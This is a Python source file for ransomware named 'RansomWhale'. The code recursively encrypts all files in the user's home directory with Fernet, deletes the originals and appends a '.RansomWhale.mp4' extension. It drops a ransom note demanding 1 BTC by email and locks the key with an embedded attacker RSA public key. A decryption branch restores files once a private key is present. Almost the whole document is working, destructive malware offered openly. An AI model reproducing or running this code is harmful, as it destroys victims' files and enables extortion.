# Goals:


#///############[Packages]############\\\#
###### cryptography package has our RSA encryption
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes

from cryptography.fernet import Fernet

import socket
import os
import glob #finds all the pathnames matching a specified pattern
##########################################



#///###########[Directory Setup]###########\\\#
homeDir = os.path.expanduser('~') #grabs user home directory
files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to encrypt   
                                                       #we can switch / for linux to \\ for windows
###############################################

 
#///###########[Targeting Files]###########\\\#
file_list=[]
important = [] #Key Storage
excluded_extensions = [".pem", ".py", ".sh", ".note"] #important for RansomWhale
for filename in files:
    if "secret.key" in filename:   
        important.append(filename)
        print ("I see you have a private key, let me validate that for you...")

    elif not any(extension in filename for extension in excluded_extensions): #Simplified logic: This makes sure we do not accidentally Encrypt things victim needs for RansomWhale
        file_list.append(filename)
###############################################



if len(important) == 0:  #if we dont see a private_key file, we want to encrypt all the files
    
    ############[Keygen]############
    fern_key = Fernet.generate_key()
    key = open("secret.key", "wb")
    key.write(fern_key)
    key.close()
    ################################
    
    
    
    ############[Encrypting Files]############
    fernet = Fernet(fern_key) #Supply Fernet with our Key
    for file in file_list:
        fileName = str(file)
        extension = os.path.splitext(file)[1]  #gets extension
        
        with open(file, 'rb') as f:
            f_bytes=f.read()
        
        f_bytes_encrypted = fernet.encrypt(f_bytes)
        print(f'RansomWhale was hungry and ate your file {file}')
        os.remove(file) #Removes our old unencrypted file
        
        fileExtension = '.RansomWhale.mp4'    #This is just for fun, adds a Custom Extension
        encFile = fileName + fileExtension  #Builds our Encrytped file with it's name + our Custom Extension
        
        with open(encFile, 'wb') as f:      
            f.write(f_bytes_encrypted)      #Writes the Encrypted bytes to our Encrypted file.
                                            # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
    
    ransomNote="""
    Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
    Please send 1btc using the payment application along with proof of purchase. 
    to our email paymentsRansom@gmail.com. Processing could take between 2 - 5 buisness days.
    Thank you for your understanding.
    """
    print(ransomNote)
    with open('ransom.note', 'w') as file:
        file.write(ransomNote)
        file.close()
    
    
    #///###########[Keygen]###########\\\#
    ## We're gonna encrypt the victim's secret.key with rsa
    
    # Want to encrypt the victim's secret.key with the attacker's public rsa key that's imbeded somehow
    # public_key_base64  if we want to hide our public key
    attacker_public_key = '''
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs1sNqnm8pIUqUwjba3n0
IJhz3g5dt9JWwa/Q9EHxVZS3/Ebv/Ic5xf8Dj+yEeVXm+VFi/+ybk61k7IdMbHGb
JWhQIfi/1ew9zdU900dWlqGPlBbJOFyCLG7SwVUKV27UpyE7s5FLbCJ23ienas8K
c7Al7BYzHE0hgyiYg3uyVO40N5pdBApAxepnu7Cr7yaaQBuHEwJjOGViAKr9DPT1
nl5ONEehktOGZKceLvP7RwS1D09P9s5c151S5CdzrS2T10qW/zFoKtrs3e9wxBeS
QRStQmHu6BHWPDiRx8Rs/1J4plbUY69emHDhM1FH7Bx8/tKamYqg5rHftoOKPb3F
dQIDAQAB
-----END PUBLIC KEY-----
'''

    
    # # Load the attacker's public key from the embedded string
    attacker_public_key = serialization.load_pem_public_key(
        attacker_public_key.encode(),
        backend=default_backend()
    )

    # Read the secret key
    with open('secret.key', 'rb') as key_file:
        secret_key = key_file.read()
        os.remove('secret.key')
    
    

    # Encrypt the secret key with RSA
    encrypted_key = attacker_public_key.encrypt(
        secret_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the encrypted key
    with open('encrypted_secret.key', 'wb') as encrypted_key_file:
        encrypted_key_file.write(encrypted_key)
    


    
else:     #read the public.key, if it works, then decrypt the files
    
    # decrypt the rsa encrypted_secret.key with private key
    with open('private_key.pem', 'rb') as private_key_file:
        private_key = serialization.load_pem_private_key(
            private_key_file.read(),
            password=None,
            backend=default_backend()
        )
        
    with open('encrypted_secret.key', 'rb') as encrypted_key_file:
        encrypted_key = encrypted_key_file.read()
    
    decrypted_key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    
    ############[Open Victim's Key]############
    # Create a Fernet object with the decrypted key
    fernet = Fernet(decrypted_key)
    ###########################################
    
        
    ############[Decrypting Files]############
    for file in file_list:
        with open(file, 'rb') as f:
            f_bytes = f.read()
            
        f_bytes_decrypt = fernet.decrypt(f_bytes)
        
        fileName = str(file).replace('.RansomWhale.mp4','')   #Replaces our Encrypted File's Extension with the file's Original Extensions
        
        decFile = fileName   #Build our Decrypted file, Filename without the RansomWhale.mp4 extension, possibly unnecessary 
            
        with open(decFile,'wb') as f:
            f.write(f_bytes_decrypt)   #Writes our decrypted bytes to the file with the Original Extensions
            os.remove(file)            #Removes the old encrypted file


        print(f'Successfully decrypted {decFile}, thank you for your purchase.')

    ################################################
    
    
    